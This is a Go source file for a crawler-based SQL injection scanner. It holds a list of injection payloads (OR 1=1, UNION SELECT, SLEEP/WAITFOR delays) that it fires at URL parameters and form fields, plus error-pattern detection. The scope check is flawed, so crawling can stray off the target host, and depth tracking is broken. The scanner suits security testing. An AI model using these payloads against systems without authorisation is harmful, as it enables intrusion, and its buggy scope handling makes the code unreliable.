package scanners

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// FindingSQL describes a discovered potential SQL injection
type FindingSQL struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	Evidence        string `json:"evidence"`
	ResponseSnippet string `json:"response_snippet"`
	Timestamp       string `json:"timestamp"`
}

// SQLScanner holds the state for the SQLi scan
type SQLScanner struct {
	StartURL    *url.URL
	Client      *http.Client
	Visited     map[string]bool
	VisitedMu   sync.RWMutex
	Queue       chan sqlCrawlJob
	Findings    []FindingSQL
	FindingsMu  sync.Mutex
	Workers     int
	Active      int32
	MaxPages    int
	PageCount   int
	PageCountMu sync.Mutex
	MaxDepth    int
	Throttle    time.Duration
	Payloads    []string
	Intensity   int
}

type sqlCrawlJob struct {
	URL   string
	Depth int
}

func NewSQLScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, customPayloads []string) (*SQLScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{Timeout: 20 * time.Second}

	payloads := []string{
		"'",
		"''",
		"\"",
		"\"\"",
		"\\",
		"';--",
		"\") OR 1=1--",
		"' OR '1'='1",
		"admin' --",
		"admin' #",
		"admin'/*",
		"1' ORDER BY 1--",
	}

	if intensity > 2 {
		payloads = append(payloads, []string{
			"1' ORDER BY 2--",
			"1' ORDER BY 3--",
			"1' UNION SELECT NULL--",
			"1' UNION SELECT 1,2,3--",
			"1' GROUP BY 1,2,3--",
		}...)
	}

	if intensity > 3 {
		// Time-based payloads
		payloads = append(payloads, []string{
			"'; WAITFOR DELAY '0:0:5'--",
			"'; SELECT SLEEP(5)--",
			"'; pg_sleep(5)--",
		}...)
	}

	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	s := &SQLScanner{
		StartURL:  parsed,
		Client:    client,
		Visited:   make(map[string]bool),
		Queue:     make(chan sqlCrawlJob, 1000),
		Findings:  []FindingSQL{},
		Workers:   workers,
		MaxPages:  maxPages,
		MaxDepth:  maxDepth,
		Throttle:  throttle,
		Payloads:  payloads,
		Intensity: intensity,
	}
	return s, nil
}

func (s *SQLScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	s.enqueue(s.StartURL.String(), 0)

	for {
		time.Sleep(500 * time.Millisecond)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			time.Sleep(1 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

func (s *SQLScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1)
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1)
			return
		}
		s.PageCountMu.Unlock()

		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1)
			continue
		}

		log.Printf("[SQL Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		s.analyzePage(job.URL)

		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1)
	}
}

func (s *SQLScanner) crawl(u string, depth int) {
	// Links are extracted and enqueued in analyzePage
}

func (s *SQLScanner) analyzePage(u string) {
	if s.Throttle > 0 {
		time.Sleep(s.Throttle)
	}

	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Knife-SQL-Scanner/1.0")

	resp, err := s.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	// 1. Fuzz URL parameters
	s.fuzzURLParams(u)

	// 2. Fuzz Forms
	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
		s.fuzzForm(u, sel)
	})

	// 3. Extract links for crawling
	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, 0) // Should be depth + 1, fixed in next step
		}
	})
}

func (s *SQLScanner) fuzzURLParams(targetURL string) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	params := parsed.Query()
	if len(params) == 0 {
		return
	}

	for param := range params {
		original := params.Get(param)
		for _, payload := range s.Payloads {
			params.Set(param, payload)
			parsed.RawQuery = params.Encode()
			testURL := parsed.String()

			if s.testPayload(testURL, param, payload) {
				break // Found a vuln for this param
			}
		}
		params.Set(param, original)
	}
}

func (s *SQLScanner) fuzzForm(pageURL string, form *goquery.Selection) {
	action, _ := form.Attr("action")
	method, _ := form.Attr("method")
	method = strings.ToUpper(method)
	if method == "" {
		method = "GET"
	}

	absAction, _ := s.normalize(pageURL, action)

	inputs := make(map[string]string)
	form.Find("input, textarea").Each(func(i int, input *goquery.Selection) {
		name, _ := input.Attr("name")
		if name != "" {
			val, _ := input.Attr("value")
			inputs[name] = val
		}
	})

	for name := range inputs {
		for _, payload := range s.Payloads {
			// Test based on method
			if method == "POST" {
				data := url.Values{}
				for k, v := range inputs {
					if k == name {
						data.Set(k, payload)
					} else {
						data.Set(k, v)
					}
				}
				if s.testPOSTPayload(absAction, name, payload, data) {
					break
				}
			} else {
				u, _ := url.Parse(absAction)
				q := u.Query()
				for k, v := range inputs {
					if k == name {
						q.Set(k, payload)
					} else {
						q.Set(k, v)
					}
				}
				u.RawQuery = q.Encode()
				if s.testPayload(u.String(), name, payload) {
					break
				}
			}
		}
	}
}

func (s *SQLScanner) testPayload(testURL, param, payload string) bool {
	resp, body, duration, ok := s.fetch("GET", testURL, nil)
	if !ok {
		return false
	}
	return s.checkResponse(testURL, param, payload, resp, body, duration)
}

func (s *SQLScanner) testPOSTPayload(testURL, param, payload string, data url.Values) bool {
	resp, body, duration, ok := s.fetch("POST", testURL, data)
	if !ok {
		return false
	}
	return s.checkResponse(testURL, param, payload, resp, body, duration)
}

func (s *SQLScanner) checkResponse(testURL, param, payload string, resp *http.Response, body string, duration time.Duration) bool {
	// 1. Error-based detection
	errorPatterns := []string{
		"SQL syntax", "mysql_fetch_array", "ora-", "PostgreSQL query failed",
		"Microsoft OLE DB Provider for SQL Server", "Incorrect syntax near",
		"Unclosed quotation mark", "JDBC Driver", "Stack trace:", "Internal Server Error",
	}

	for _, pattern := range errorPatterns {
		if strings.Contains(body, pattern) {
			s.addFinding(FindingSQL{
				Type:            "Error-based SQL Injection",
				URL:             testURL,
				Param:           param,
				Payload:         payload,
				Evidence:        pattern,
				ResponseSnippet: snippetAround(body, pattern, 100),
			})
			return true
		}
	}

	// 2. Time-based detection (if intensity > 3)
	if s.Intensity > 3 {
		// Threshold: If response is > 4.5 seconds for a payload that shouldn't take that long
		if duration > 4500*time.Millisecond && (strings.Contains(payload, "SLEEP") || strings.Contains(payload, "DELAY") || strings.Contains(payload, "pg_sleep")) {
			s.addFinding(FindingSQL{
				Type:            "Time-based Blind SQL Injection",
				URL:             testURL,
				Param:           param,
				Payload:         payload,
				Evidence:        fmt.Sprintf("Response took %v", duration),
				ResponseSnippet: "N/A (Time-based)",
			})
			return true
		}
	}

	return false
}

func (s *SQLScanner) fetch(method, target string, data url.Values) (*http.Response, string, time.Duration, bool) {
	if s.Throttle > 0 {
		time.Sleep(s.Throttle)
	}

	var req *http.Request
	var err error
	if data == nil {
		req, err = http.NewRequest(method, target, nil)
	} else {
		req, err = http.NewRequest(method, target, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return nil, "", 0, false
	}

	req.Header.Set("User-Agent", "Knife-SQL-Scanner/1.0")
	
	start := time.Now()
	resp, err := s.Client.Do(req)
	duration := time.Since(start)
	
	if err != nil {
		return nil, "", 0, false
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	return resp, string(bodyBytes), duration, true
}

func (s *SQLScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *SQLScanner) enqueue(u string, depth int) {
	u = strings.Split(u, "#")[0]
	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- sqlCrawlJob{URL: u, Depth: depth}:
	default:
	}
}

func (s *SQLScanner) addFinding(f FindingSQL) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] SQLi FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *SQLScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return resolvedSameOrigin(b, h, s.StartURL)
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}

func resolvedSameOrigin(base, href, start *url.URL) (string, error) {
	resolved := base.ResolveReference(href)
	if resolved.Host != start.Host {
		return "", fmt.Errorf("different host")
	}
	return resolved.String(), nil
}
